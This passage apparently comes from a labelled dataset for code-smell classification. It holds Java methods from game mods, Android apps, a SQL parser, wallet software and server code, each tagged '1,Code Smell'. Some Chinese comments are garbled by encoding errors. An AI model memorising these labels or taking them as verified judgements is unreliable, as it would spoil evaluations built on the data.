  List<AdminFile> fileList=lambdaQuery().select(AdminFile::getFileId).eq(AdminFile::getBatchId,deleteByBatchIdBO.getBatchId()).eq(StrUtil.isNotEmpty(fileType),AdminFile::getFileType,fileType).list();
  List<Long> fileIdList=fileList.stream().map(AdminFile::getFileId).collect(Collectors.toList());
  fileIdList.forEach(this::deleteById);
}",1,Code Smell
"@Override public void disassemble(){
  if (!running && movedContraption == null && mirrorParent == null)   return;
  offset=getGridOffset(offset);
  if (movedContraption != null)   resetContraptionToOffset();
  if (!level.isClientSide) {
    if (shouldCreateRopes()) {
      if (offset > 0) {
        BlockPos magnetPos=worldPosition.below((int)offset);
        FluidState ifluidstate=level.getFluidState(magnetPos);
        if (level.getBlockState(magnetPos).getDestroySpeed(level,magnetPos) != -1) {
          level.destroyBlock(magnetPos,level.getBlockState(magnetPos).getCollisionShape(level,magnetPos).isEmpty());
          level.setBlock(magnetPos,AllBlocks.PULLEY_MAGNET.getDefaultState().setValue(BlockStateProperties.WATERLOGGED,Boolean.valueOf(ifluidstate.getType() == Fluids.WATER)),66);
        }
      }
      boolean[] waterlog=new boolean[(int)offset];
      for (      boolean destroyPass : Iterate.trueAndFalse) {
        for (int i=1; i <= ((int)offset) - 1; i++) {
          BlockPos ropePos=worldPosition.below(i);
          if (level.getBlockState(ropePos).getDestroySpeed(level,ropePos) == -1)           continue;
          if (destroyPass) {
            FluidState ifluidstate=level.getFluidState(ropePos);
            waterlog[i]=ifluidstate.getType() == Fluids.WATER;
            level.destroyBlock(ropePos,level.getBlockState(ropePos).getCollisionShape(level,ropePos).isEmpty());
            continue;
          }
          level.setBlock(worldPosition.below(i),AllBlocks.ROPE.getDefaultState().setValue(BlockStateProperties.WATERLOGGED,waterlog[i]),66);
        }
      }
    }
    if (movedContraption != null && mirrorParent == null)     movedContraption.disassemble();
    notifyMirrorsOfDisassembly();
  }
  if (movedContraption != null)   movedContraption.discard();
  movedContraption=null;
  initialOffset=0;
  running=false;
  sendData();
}",1,Code Smell
"/** 
 * Validates an INTERVAL literal against an HOUR TO SECOND interval qualifier.
 * @throws com.qihoo.qsql.org.apache.calcite.runtime.CalciteContextException if the intervalvalue is illegal
 */
private int[] evaluateIntervalLiteralAsHourToSecond(RelDataTypeSystem typeSystem,int sign,String value,String originalValue,SqlParserPos pos){
  BigDecimal hour;
  BigDecimal minute;
  BigDecimal second;
  BigDecimal secondFrac;
  boolean hasFractionalSecond;
  final int fractionalSecondPrecision=getFractionalSecondPrecision(typeSystem);
  String intervalPatternWithFracSec=""(\\d+):(\\d{1,2}):(\\d{1,2})\\.(\\d{1,"" + fractionalSecondPrecision + ""})"";
  String intervalPatternWithoutFracSec=""(\\d+):(\\d{1,2}):(\\d{1,2})"";
  Matcher m=Pattern.compile(intervalPatternWithFracSec).matcher(value);
  if (m.matches()) {
    hasFractionalSecond=true;
  }
 else {
    m=Pattern.compile(intervalPatternWithoutFracSec).matcher(value);
    hasFractionalSecond=false;
  }
  if (m.matches()) {
    try {
      hour=parseField(m,1);
      minute=parseField(m,2);
      second=parseField(m,3);
    }
 catch (    NumberFormatException e) {
      throw invalidValueException(pos,originalValue);
    }
    if (hasFractionalSecond) {
      secondFrac=normalizeSecondFraction(m.group(4));
    }
 else {
      secondFrac=ZERO;
    }
    checkLeadFieldInRange(typeSystem,sign,hour,TimeUnit.HOUR,pos);
    if (!(isSecondaryFieldInRange(minute,TimeUnit.MINUTE)) || !(isSecondaryFieldInRange(second,TimeUnit.SECOND)) || !(isFractionalSecondFieldInRange(secondFrac))) {
      throw invalidValueException(pos,originalValue);
    }
    return fillIntervalValueArray(sign,ZERO,hour,minute,second,secondFrac);
  }
 else {
    throw invalidValueException(pos,originalValue);
  }
}",1,Code Smell
"@Override public void onActivityResult(int requestCode,int resultCode,Intent data){
  if (requestCode == SCAN_RESULT && resultCode == Activity.RESULT_OK && BarcodeScanner.isValidResult(data)) {
    Barcode code=BarcodeScanner.getResult(data);
    if (code != null) {
      if (code.rawValue.startsWith(""https:"") || code.rawValue.startsWith(""http:"")) {
        ((MainActivity)getActivity()).handleURL(Uri.parse(code.rawValue),accountID);
        dismiss();
      }
 else {
        Toast.makeText(themeWrapper,R.string.link_not_supported,Toast.LENGTH_SHORT).show();
      }
    }
  }
}
",1,Code Smell
"private void saveLog(Method method,boolean flag,LogRecordOps operation,String operatorIdFromService,String action,Map<String,String> expressionValues){
  if (StringUtils.isEmpty(expressionValues.get(action)) || (!diffLog && action.contains(""#"") && Objects.equals(action,expressionValues.get(action)))) {
    return;
  }
  LogRecord logRecord=LogRecord.builder().tenant(tenantId).type(expressionValues.get(operation.getType())).bizNo(expressionValues.get(operation.getBizNo())).operator(getRealOperatorId(operation,operatorIdFromService,expressionValues)).subType(expressionValues.get(operation.getSubType())).extra(expressionValues.get(operation.getExtra())).codeVariable(getCodeVariable(method)).action(expressionValues.get(action)).fail(flag).createTime(new Date()).build();
  bizLogService.record(logRecord);
}
",1,Code Smell
"@PostMapping(""/readiness"") public String serverReady(@RequestParam(value=""broadcast"",required=false) boolean broadcast){
  log.info(""receive readiness access...."");
  boolean readiness=true;
  if (!broadcast) {
    List<Server> servers=serverListManager.getServers();
    if (!CollectionUtils.isEmpty(servers)) {
      for (      Server server : servers) {
        String url=String.format(""http://%s:%s/nacos/readiness?broadcast=true"",server.getIp(),server.getServePort());
        ResponseEntity<String> responseEntity=restTemplate.postForEntity(url,null,String.class);
        if (HttpStatus.OK.value() != responseEntity.getStatusCode().value()) {
          readiness=false;
          log.warn(""readiness failed..., code={}"",responseEntity.getStatusCode());
        }
      }
    }
  }
  if (readiness) {
    serverReady=true;
    return ""success"";
  }
  return ""failed"";
}
",1,Code Smell
"/** 
 * 涓虹┖鎼滅储
 * @param search       鎼滅储鏉′欢
 * @param queryBuilder 鏌ヨ鍣�
 */
private static void isNullSearch(CrmSearchBO.Search search,BoolQueryBuilder queryBuilder){
  FieldEnum fieldEnum=FieldEnum.parse(search.getFormType());
  if (Arrays.asList(FieldEnum.DATETIME,FieldEnum.DATE,FieldEnum.NUMBER,FieldEnum.FLOATNUMBER).contains(fieldEnum)) {
    queryBuilder.mustNot(QueryBuilders.existsQuery(search.getName()));
  }
 else {
    BoolQueryBuilder builder=QueryBuilders.boolQuery();
    builder.should(QueryBuilders.termQuery(search.getName(),""""));
    builder.should(QueryBuilders.boolQuery().mustNot(QueryBuilders.existsQuery(search.getName())));
    queryBuilder.filter(builder);
  }
}
",1,Code Smell
"public static DriverFileIO create(Emulator<?> emulator,int oflags,String pathname){
  if (""/dev/urandom"".equals(pathname) || ""/dev/random"".equals(pathname) || ""/dev/srandom"".equals(pathname)) {
    return new RandomFileIO(emulator,pathname);
  }
  if (""/dev/null"".equals(pathname)) {
    return new DriverFileIO(emulator,oflags,pathname);
  }
  return null;
}
",1,Code Smell
"protected void shiftBuckets(long tableAddr,long pos,long mask){
  long last;
  long slot;
  int currX;
  long currValue;
  for (; ; ) {
    pos=((last=pos) + 1L) & mask;
    for (; ; pos=(pos + 1L) & mask) {
      long currAddr=tableAddr + pos * BUCKET_BYTES;
      if ((currValue=PUnsafe.getLong(currAddr + BUCKET_VALUE_OFFSET)) == 0L) {
        PUnsafe.setMemory(tableAddr + last * BUCKET_BYTES,BUCKET_BYTES,(byte)0);
        return;
      }
      slot=hashPosition(currX=PUnsafe.getInt(currAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET)) & mask;
      if (last <= pos ? last >= slot || slot > pos : last >= slot && slot > pos) {
        long lastAddr=tableAddr + last * BUCKET_BYTES;
        PlatformDependent.putInt(lastAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET,currX);
        PlatformDependent.putLong(lastAddr + BUCKET_VALUE_OFFSET,currValue);
        break;
      }
    }
  }
}",1,Code Smell
"private Collection<BaseDanmaku> subset(long startTime,long endTime){
  if (mSortType == ST_BY_LIST || items == null || items.size() == 0) {
    return null;
  }
  if (subItems == null) {
    subItems=new Danmakus(mDuplicateMergingEnabled);
    subItems.mLockObject=this.mLockObject;
  }
  if (startSubItem == null) {
    startSubItem=createItem(""start"");
  }
  if (endSubItem == null) {
    endSubItem=createItem(""end"");
  }
  startSubItem.setTime(startTime);
  endSubItem.setTime(endTime);
  return ((SortedSet<BaseDanmaku>)items).subSet(startSubItem,endSubItem);
}",1,Code Smell
"private int findItem(ItemStack itemStack,int excludedSlot,int goodEnoughCount){
  int slot=-1;
  int count=0;
  for (int i=mc.player.getInventory().size() - 2; i >= (searchHotbar.get() ? 0 : 9); i--) {
    ItemStack stack=mc.player.getInventory().getStack(i);
    if (i != excludedSlot && stack.getItem() == itemStack.getItem() && ItemStack.areItemsAndComponentsEqual(itemStack,stack)) {
      if (stack.getCount() > count) {
        slot=i;
        count=stack.getCount();
        if (count >= goodEnoughCount)         break;
      }
    }
  }
  return slot;
}",1,Code Smell
"/** 
 * 查找(x, y)处最深的节点
 * @param root
 * @param x
 * @param y
 * @return
 */
public static AbstractNodeTree findDeepestNode(AbstractNodeTree root,int x,int y){
  if (root == null || !root.getNodeBound().contains(x,y)) {
    LogUtil.w(TAG,""Root为空或者不包含坐标位置"");
    return null;
  }
  List<AbstractNodeTree> candiateNodes=new ArrayList<>();
  Queue<AbstractNodeTree> findQueue=new LinkedList<>();
  AbstractNodeTree targetWindow=root;
  if (root instanceof FakeNodeTree) {
    List<AbstractNodeTree> windows=root.getChildrenNodes();
    int maxIdx=-1;
    for (    AbstractNodeTree window : windows) {
      if (window instanceof InputWindowTree) {
        if (window.getNodeBound().contains(x,y)) {
          return window;
        }
      }
      if (window.getDrawingOrder() > maxIdx && window.getNodeBound().contains(x,y)) {
        maxIdx=window.getDrawingOrder();
        targetWindow=window;
      }
    }
  }
  findQueue.add(targetWindow);
  AbstractNodeTree currentNode;
  while ((currentNode=findQueue.poll()) != null) {
    boolean contains=currentNode.getNodeBound().contains(x,y);
    if (contains && (currentNode.isSelfUsableForLocating() || (currentNode.getChildrenNodes() != null && currentNode.getChildrenNodes().size() > 0))) {
      candiateNodes.add(currentNode);
    }
    if (currentNode.getChildrenNodes() != null) {
      findQueue.addAll(currentNode.getChildrenNodes());
    }
  }
  LogUtil.d(TAG,""get nodes count:"" + candiateNodes.size());
  if (candiateNodes.size() == 0) {
    return null;
  }
  AbstractNodeTree min=candiateNodes.get(0);
  int minSize=calculateRectSize(min.getNodeBound());
  for (  AbstractNodeTree node : candiateNodes) {
    int curSize=calculateRectSize(node.getNodeBound());
    if (curSize < minSize) {
      min=node;
      minSize=curSize;
    }
 else     if (curSize == minSize) {
      if (node.hasParent(min)) {
        min=node;
      }
    }
  }
  return min;
}",1,Code Smell
"/** 
 * Create a new instance of a PullParserFactory that can be used to create XML pull parsers (see class description for more details).
 * @return a new instance of a PullParserFactory, as returned by newInstance (null, null); 
 */
public static XmlPullParserFactory newInstance() throws XmlPullParserException {
  return newInstance(null,null);
}
public static XmlPullParserFactory newInstance(String classNames,Class context) throws XmlPullParserException {
  if (context == null) {
    context=referenceContextClass;
  }
  String classNamesLocation=null;
  if (classNames == null || classNames.length() == 0 || ""DEFAULT"".equals(classNames)) {
    try {
      InputStream is=context.getResourceAsStream(RESOURCE_NAME);
      if (is == null)       throw new XmlPullParserException(""resource not found: "" + RESOURCE_NAME + "" make sure that parser implementing XmlPull API is available"");
      final StringBuffer sb=new StringBuffer();
      while (true) {
        final int ch=is.read();
        if (ch < 0)         break;
 else         if (ch > ' ')         sb.append((char)ch);
      }
      is.close();
      classNames=sb.toString();
    }
 catch (    Exception e) {
      throw new XmlPullParserException(null,null,e);
    }
    classNamesLocation=""resource "" + RESOURCE_NAME + "" that contained '""+ classNames+ ""'"";
  }
 else {
    classNamesLocation=""parameter classNames to newInstance() that contained '"" + classNames + ""'"";
  }
  XmlPullParserFactory factory=null;
  final Vector parserClasses=new Vector();
  final Vector serializerClasses=new Vector();
  int pos=0;
  while (pos < classNames.length()) {
    int cut=classNames.indexOf(',',pos);
    if (cut == -1)     cut=classNames.length();
    final String name=classNames.substring(pos,cut);
    Class candidate=null;
    Object instance=null;
    try {
      candidate=Class.forName(name);
      instance=candidate.newInstance();
    }
 catch (    Exception e) {
    }
    if (candidate != null) {
      boolean recognized=false;
      if (instance instanceof XmlPullParser) {
        parserClasses.addElement(candidate);
        recognized=true;
      }
      if (instance instanceof XmlSerializer) {
        serializerClasses.addElement(candidate);
        recognized=true;
      }
      if (instance instanceof XmlPullParserFactory) {
        if (factory == null) {
          factory=(XmlPullParserFactory)instance;
        }
        recognized=true;
      }
      if (!recognized) {
        throw new XmlPullParserException(""incompatible class: "" + name);
      }
    }
    pos=cut + 1;
  }
  if (factory == null) {
    factory=new XmlPullParserFactory();
  }
  factory.parserClasses=parserClasses;
  factory.serializerClasses=serializerClasses;
  factory.classNamesLocation=classNamesLocation;
  return factory;
}",1,Code Smell
"/** 
 * Reads the number of short term reference picture sets in a SPS as ue(v), then skips all of them. See H.265/HEVC (2014) 7.3.7.
 */
private static void skipShortTermRefPicSets(ParsableNalUnitBitArray bitArray){
  int numShortTermRefPicSets=bitArray.readUnsignedExpGolombCodedInt();
  boolean interRefPicSetPredictionFlag=false;
  int numNegativePics;
  int numPositivePics;
  int previousNumDeltaPocs=0;
  for (int stRpsIdx=0; stRpsIdx < numShortTermRefPicSets; stRpsIdx++) {
    if (stRpsIdx != 0) {
      interRefPicSetPredictionFlag=bitArray.readBit();
    }
    if (interRefPicSetPredictionFlag) {
      bitArray.skipBit();
      bitArray.readUnsignedExpGolombCodedInt();
      for (int j=0; j <= previousNumDeltaPocs; j++) {
        if (bitArray.readBit()) {
          bitArray.skipBit();
        }
      }
    }
 else {
      numNegativePics=bitArray.readUnsignedExpGolombCodedInt();
      numPositivePics=bitArray.readUnsignedExpGolombCodedInt();
      previousNumDeltaPocs=numNegativePics + numPositivePics;
      for (int i=0; i < numNegativePics; i++) {
        bitArray.readUnsignedExpGolombCodedInt();
        bitArray.skipBit();
      }
      for (int i=0; i < numPositivePics; i++) {
        bitArray.readUnsignedExpGolombCodedInt();
        bitArray.skipBit();
      }
    }
  }
}",1,Code Smell
"@Override protected void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (Build.VERSION.SDK_INT >= 23 && Build.VERSION.SDK_INT < 29 && !isStorageAllowed(this))   requestStoragePermission();
 else   exit();
}",1,Code Smell
"public static byte[] getFileAttributes(File file){
  try {
    if (file == null || (!Files.isSymbolicLink(file.toPath()) && !file.exists())) {
      return new byte[4];
    }
    Path path=file.toPath();
    if (isWindows()) {
      return getWindowsFileAttributes(path);
    }
 else     if (isMac() || isUnix()) {
      return getPosixFileAttributes(path);
    }
 else {
      return new byte[4];
    }
  }
 catch (  NoSuchMethodError e) {
    return new byte[4];
  }
}",1,Code Smell
"private void hookOnHolder(){
  Class<?> recentContactItemHolderClass=ClassUtils.getClass(""com.tencent.qqnt.chats.core.adapter.holder.RecentContactItemHolder"");
  Method onHolderBindTimeingCallSetOnClickMethod=null;
  for (  Method method : recentContactItemHolderClass.getDeclaredMethods()) {
    Class<?>[] paramTypes=method.getParameterTypes();
    if (paramTypes.length == 3) {
      if (paramTypes[0].getName().startsWith(""com.tencent.qqnt.chats.core.adapter.builder."") && paramTypes[1].getName().startsWith(""com.tencent.qqnt.chats.core.adapter."") && paramTypes[2] == int.class) {
        method.setAccessible(true);
        onHolderBindTimeingCallSetOnClickMethod=method;
        break;
      }
    }
  }
  HookUtils.hookBeforeIfEnabled(cleanRecentChat,onHolderBindTimeingCallSetOnClickMethod,param -> {
    int adapterIndex=(int)param.args[2];
    Object item=param.args[1];
    viewHolderList.put(param.thisObject,adapterIndex);
  }
);
  Method onCreate=MethodTool.find(""com.tencent.qqnt.chats.core.adapter.ChatsListAdapter"").name(""onCreateViewHolder"").params(android.view.ViewGroup.class,int.class).get();
  HookUtils.hookAfterIfEnabled(cleanRecentChat,onCreate,param -> {
    viewHolderList.put(param.getResult(),(int)param.args[1]);
  }
);
}",1,Code Smell
"/** 
 * Sends the message and returns whether the message was sent to its target. 
 */
public boolean maybeSendToTarget(long currentTimeMs){
  if (postTime <= currentTimeMs) {
    if (runnable != null) {
      handler.post(runnable);
    }
 else {
      handler.sendEmptyMessage(message);
    }
    return true;
  }
  return false;
}
",1,Code Smell
"int getSubPositionByView(View view,View childView){
  if (view == null || childView == null) {
    return 0;
  }
  final LayoutParams lp=(LayoutParams)view.getLayoutParams();
  final ItemAlignmentFacet facet=lp.getItemAlignmentFacet();
  if (facet != null) {
    final ItemAlignmentFacet.ItemAlignmentDef[] defs=facet.getAlignmentDefs();
    if (defs.length > 1) {
      while (childView != view) {
        int id=childView.getId();
        if (id != View.NO_ID) {
          for (int i=1; i < defs.length; i++) {
            if (defs[i].getItemAlignmentFocusViewId() == id) {
              return i;
            }
          }
        }
        childView=(View)childView.getParent();
      }
    }
  }
  return 0;
}",1,Code Smell
"/** 
 * private method 
 */
private void collectMetrics(Long clusterPhyId,String topicName,Map<Integer,TopicMetrics> metricsMap,List<VersionControlItem> items){
  long startTime=System.currentTimeMillis();
  TopicMetrics aggMetrics=metricsMap.get(AGG_METRICS_BROKER_ID);
  for (  VersionControlItem v : items) {
    try {
      if (aggMetrics.getMetrics().containsKey(v.getName())) {
        continue;
      }
      Result<List<TopicMetrics>> ret=topicMetricService.collectTopicMetricsFromKafkaWithCacheFirst(clusterPhyId,topicName,v.getName());
      if (null == ret || ret.failed() || ValidateUtils.isEmptyList(ret.getData())) {
        continue;
      }
      ret.getData().stream().forEach(metrics -> {
        if (metrics.isBBrokerAgg()) {
          aggMetrics.putMetric(metrics.getMetrics());
        }
 else {
          metricsMap.putIfAbsent(metrics.getBrokerId(),new TopicMetrics(topicName,clusterPhyId,metrics.getBrokerId(),false));
          metricsMap.get(metrics.getBrokerId()).putMetric(metrics.getMetrics());
        }
      }
);
    }
 catch (    Exception e) {
      LOGGER.error(""method=collectMetrics||clusterPhyId={}||topicName={}||metricName={}||errMsg=exception!"",clusterPhyId,topicName,v.getName(),e);
    }
  }
  aggMetrics.putMetric(Constant.COLLECT_METRICS_COST_TIME_METRICS_NAME,(System.currentTimeMillis() - startTime) / 1000.0f);
}",1,Code Smell
"@Override public Flux<MqttMessage> subscribe(List<String> topics,int qos){
  return Flux.create(sink -> {
    Disposable.Composite composite=Disposables.composite();
    for (    String topic : topics) {
      String realTopic=parseTopic(topic);
      String completeTopic=getCompleteTopic(topic);
      Topic<Tuple3<String,FluxSink<MqttMessage>,Integer>> sinkTopic=subscriber.append(realTopic.replace(""#"",""**"").replace(""+"",""*""));
      Tuple3<String,FluxSink<MqttMessage>,Integer> topicQos=Tuples.of(topic,sink,qos);
      boolean first=sinkTopic.getSubscribers().isEmpty();
      sinkTopic.subscribe(topicQos);
      composite.add(() -> {
        if (!sinkTopic.unsubscribe(topicQos).isEmpty() && isAlive() && sinkTopic.getSubscribers().isEmpty()) {
          client.unsubscribe(convertMqttTopic(completeTopic),result -> {
            if (result.succeeded()) {
              log.debug(""unsubscribe mqtt topic {}"",completeTopic);
            }
 else {
              log.debug(""unsubscribe mqtt topic {} error"",completeTopic,result.cause());
            }
          }
);
        }
      }
);
      if (isAlive() && first) {
        log.debug(""subscribe mqtt topic {}"",completeTopic);
        client.subscribe(convertMqttTopic(completeTopic),qos,result -> {
          if (!result.succeeded()) {
            sink.error(result.cause());
          }
        }
);
      }
    }
    sink.onDispose(composite);
  }
);
}",1,Code Smell
"public static byte[] imageToPdf(MultipartFile[] files,String fitOption,boolean autoRotate,String colorType) throws IOException {
  try (PDDocument doc=new PDDocument()){
    for (    MultipartFile file : files) {
      String contentType=file.getContentType();
      String originalFilename=Filenames.toSimpleFileName(file.getOriginalFilename());
      if (originalFilename != null && (originalFilename.toLowerCase().endsWith("".tiff"") || originalFilename.toLowerCase().endsWith("".tif""))) {
        ImageReader reader=ImageIO.getImageReadersByFormatName(""tiff"").next();
        reader.setInput(ImageIO.createImageInputStream(file.getInputStream()));
        int numPages=reader.getNumImages(true);
        for (int i=0; i < numPages; i++) {
          BufferedImage pageImage=reader.read(i);
          BufferedImage convertedImage=ImageProcessingUtils.convertColorType(pageImage,colorType);
          PDImageXObject pdImage=LosslessFactory.createFromImage(doc,convertedImage);
          addImageToDocument(doc,pdImage,fitOption,autoRotate);
        }
      }
 else {
        BufferedImage image=ImageIO.read(file.getInputStream());
        BufferedImage convertedImage=ImageProcessingUtils.convertColorType(image,colorType);
        PDImageXObject pdImage=(contentType != null && ""image/jpeg"".equals(contentType)) ? JPEGFactory.createFromImage(doc,convertedImage) : LosslessFactory.createFromImage(doc,convertedImage);
        addImageToDocument(doc,pdImage,fitOption,autoRotate);
      }
    }
    ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
    doc.save(byteArrayOutputStream);
    logger.info(""PDF successfully saved to byte array"");
    return byteArrayOutputStream.toByteArray();
  }
 }",1,Code Smell
"@Override public WalletModel getWalletModel(){
  return WalletModel.SPECTER_DESKTOP;
}
public WalletModel getWalletModel(){
  if (type != null) {
    String model=type;
    if (model.equals(""cobo"")) {
      model=""cobovault"";
    }
    WalletModel walletModel=WalletModel.fromType(model);
    if (walletModel == WalletModel.SPECTER_DESKTOP) {
      walletModel=WalletModel.SPECTER_DIY;
    }
    if (walletModel == WalletModel.TREZOR_1) {
      walletModel=WalletModel.TREZOR_T;
    }
    return walletModel;
  }
  return null;
}",1,Code Smell
"private File getTemporaryExtraction(long after){
  File tmpDir=new File(System.getProperty(""java.io.tmpdir""));
  if (!tmpDir.exists()) {
    return null;
  }
  File[] tmps=tmpDir.listFiles(file -> {
    if (!file.isDirectory() || file.lastModified() < after) {
      return false;
    }
    String name=file.getName();
    if (name.length() < 9 || !name.startsWith(""_MEI"")) {
      return false;
    }
    File hwilib=new File(file,""hwilib"");
    return hwilib.exists();
  }
);
  return tmps == null || tmps.length == 0 ? null : Arrays.stream(tmps).sorted(Comparator.comparingLong(File::lastModified)).findFirst().orElse(null);
}",1,Code Smell
"private static int[] generateDefault8BitClutEntries(){
  int[] entries=new int[256];
  entries[0]=0x00000000;
  for (int i=0; i < entries.length; i++) {
    if (i < 8) {
      entries[i]=getColor(0x3F,((i & 0x01) != 0 ? 0xFF : 0x00),((i & 0x02) != 0 ? 0xFF : 0x00),((i & 0x04) != 0 ? 0xFF : 0x00));
    }
 else {
switch (i & 0x88) {
case 0x00:
        entries[i]=getColor(0xFF,(((i & 0x01) != 0 ? 0x55 : 0x00) + ((i & 0x10) != 0 ? 0xAA : 0x00)),(((i & 0x02) != 0 ? 0x55 : 0x00) + ((i & 0x20) != 0 ? 0xAA : 0x00)),(((i & 0x04) != 0 ? 0x55 : 0x00) + ((i & 0x40) != 0 ? 0xAA : 0x00)));
      break;
case 0x08:
    entries[i]=getColor(0x7F,(((i & 0x01) != 0 ? 0x55 : 0x00) + ((i & 0x10) != 0 ? 0xAA : 0x00)),(((i & 0x02) != 0 ? 0x55 : 0x00) + ((i & 0x20) != 0 ? 0xAA : 0x00)),(((i & 0x04) != 0 ? 0x55 : 0x00) + ((i & 0x40) != 0 ? 0xAA : 0x00)));
  break;
case 0x80:
entries[i]=getColor(0xFF,(127 + ((i & 0x01) != 0 ? 0x2B : 0x00) + ((i & 0x10) != 0 ? 0x55 : 0x00)),(127 + ((i & 0x02) != 0 ? 0x2B : 0x00) + ((i & 0x20) != 0 ? 0x55 : 0x00)),(127 + ((i & 0x04) != 0 ? 0x2B : 0x00) + ((i & 0x40) != 0 ? 0x55 : 0x00)));
break;
case 0x88:
entries[i]=getColor(0xFF,(((i & 0x01) != 0 ? 0x2B : 0x00) + ((i & 0x10) != 0 ? 0x55 : 0x00)),(((i & 0x02) != 0 ? 0x2B : 0x00) + ((i & 0x20) != 0 ? 0x55 : 0x00)),(((i & 0x04) != 0 ? 0x2B : 0x00) + ((i & 0x40) != 0 ? 0x55 : 0x00)));
break;
}
}
}
return entries;
}",1,Code Smell
"/** 
 * 鑾峰彇鎸囧畾鍗曞厓鐨� http client
 * @param unit 鍗曞厓瀵硅薄
 * @return http client
 */
public static OkHttpClient getHttpClient(UnitDO unit){
  OkHttpClient httpClient;
  if (unit.getEndpoint().contains(LOCALHOST)) {
    httpClient=HttpClientFactory.getHttpClient();
  }
 else   if (StringUtils.isNotEmpty(unit.getProxyIp()) && Integer.parseInt(unit.getProxyPort()) > 0) {
    httpClient=HttpClientFactory.getHttpClient(unit.getProxyIp(),Integer.parseInt(unit.getProxyPort()));
  }
 else {
    httpClient=HttpClientFactory.getHttpClient();
  }
  return httpClient;
}",1,Code Smell
"public boolean manageFlows(Level world,BlockPos pos,FluidStack internalFluid,Predicate<FluidStack> extractionPredicate){
  Optional<FluidNetwork> retainedNetwork=network;
  network=Optional.empty();
  if (!source.isPresent() && !determineSource(world,pos))   return false;
  FlowSource flowSource=source.get();
  if (!hasFlow()) {
    if (!hasPressure())     return false;
    boolean prioritizeInbound=comparePressure() < 0;
    for (    boolean trueFalse : Iterate.trueAndFalse) {
      boolean inbound=prioritizeInbound == trueFalse;
      if (pressure.get(inbound) == 0)       continue;
      if (tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid))       return true;
    }
    return false;
  }
  Flow flow=this.flow.get();
  FluidStack provided=flow.inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid;
  if (!hasPressure() || provided.isEmpty() || !provided.isFluidEqual(flow.fluid)) {
    this.flow=Optional.empty();
    return true;
  }
  if (flow.inbound != comparePressure() < 0) {
    boolean inbound=!flow.inbound;
    if (inbound && !provided.isEmpty() || !inbound && !internalFluid.isEmpty()) {
      FluidPropagator.resetAffectedFluidNetworks(world,pos,side);
      tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid);
      return true;
    }
  }
  flowSource.whileFlowPresent(world,flow.inbound);
  if (!flowSource.isEndpoint())   return false;
  if (!flow.inbound)   return false;
  network=retainedNetwork;
  if (!hasNetwork())   network=Optional.of(new FluidNetwork(world,new BlockFace(pos,side),flowSource::provideHandler));
  network.get().tick();
  return false;
}",1,Code Smell
"@Override public void visitProgramClass(ProgramClass programClass){
  if ((programClass.u2accessFlags & (AccessConstants.FINAL | AccessConstants.INTERFACE | AccessConstants.ABSTRACT)) == 0 && !KeepMarker.isKept(programClass) && programClass.subClassCount == 0) {
    programClass.u2accessFlags|=AccessConstants.FINAL;
    if (extraClassVisitor != null) {
      extraClassVisitor.visitProgramClass(programClass);
    }
  }
}",1,Code Smell
"private BitcoinURI getPayjoinURI(){
  if (headersForm.getPsbt() != null) {
    for (    TransactionOutput txOutput : headersForm.getPsbt().getTransaction().getOutputs()) {
      try {
        Address address=txOutput.getScript().getToAddresses()[0];
        BitcoinURI bitcoinURI=AppServices.getPayjoinURI(address);
        if (bitcoinURI != null) {
          return bitcoinURI;
        }
      }
 catch (      Exception e) {
      }
    }
  }
  return null;
}",1,Code Smell
"/** 
 * 鑾峰彇璺敱鍦板潃
 * @param menu 鑿滃崟淇℃伅
 * @return 璺敱鍦板潃
 */
public String getRouterPath(SysMenu menu){
  String routerPath=menu.getPath();
  if (menu.getParentId().intValue() != 0 && isInnerLink(menu)) {
    routerPath=innerLinkReplaceEach(routerPath);
  }
  if (0 == menu.getParentId().intValue() && UserConstants.TYPE_DIR.equals(menu.getMenuType()) && UserConstants.NO_FRAME.equals(menu.getIsFrame())) {
    routerPath=""/"" + menu.getPath();
  }
 else   if (isMenuFrame(menu)) {
    routerPath=""/"";
  }
  return routerPath;
}",1,Code Smell
"/** 
 * Returns whether the given word is a valid Java identifier. Wildcard characters are accepted.
 */
private boolean isJavaIdentifier(String word){
  if (word.length() == 0) {
    return false;
  }
  for (int index=0; index < word.length(); index++) {
    char c=word.charAt(index);
    if (!(Character.isJavaIdentifierPart(c) || c == '.' || c == '[' || c == ']' || c == '<' || c == '>' || c == '-' || c == '!' || c == '*' || c == '?' || c == '%')) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"private void tickAudio(){
  Vec3 vec=VecHelper.getCenterOf(worldPosition);
  if (lid.settled()) {
    if (openCount > 0 && lid.getChaseTarget() == 0) {
      level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.IRON_DOOR_OPEN,SoundSource.BLOCKS,0.25F,level.random.nextFloat() * 0.1F + 1.2F,true);
      level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.CHEST_OPEN,SoundSource.BLOCKS,0.1F,level.random.nextFloat() * 0.1F + 1.1F,true);
    }
    if (openCount == 0 && lid.getChaseTarget() == 1)     level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.CHEST_CLOSE,SoundSource.BLOCKS,0.1F,level.random.nextFloat() * 0.1F + 1.1F,true);
  }
 else   if (openCount == 0 && lid.getChaseTarget() == 0 && lid.getValue(0) > 1 / 16f && lid.getValue(1) < 1 / 16f)   level.playLocalSound(vec.x,vec.y,vec.z,SoundEvents.IRON_DOOR_CLOSE,SoundSource.BLOCKS,0.25F,level.random.nextFloat() * 0.1F + 1.2F,true);
}",1,Code Smell
"private List<String> tokenize(String json){
  List<String> list=new ArrayList<>();
  int index=0;
  int inObject=0;
  int inList=0;
  boolean inValue=false;
  boolean inEscape=false;
  StringBuilder build=new StringBuilder();
  while (index < json.length()) {
    char current=json.charAt(index);
    if (inEscape) {
      build.append(current);
      index++;
      inEscape=false;
      continue;
    }
    if (current == '{') {
      inObject++;
    }
    if (current == '}') {
      inObject--;
    }
    if (current == '[') {
      inList++;
    }
    if (current == ']') {
      inList--;
    }
    if (current == '""') {
      inValue=!inValue;
    }
    if (current == ',' && inObject == 0 && inList == 0 && !inValue) {
      list.add(build.toString());
      build.setLength(0);
    }
 else     if (current == '\\') {
      inEscape=true;
    }
 else {
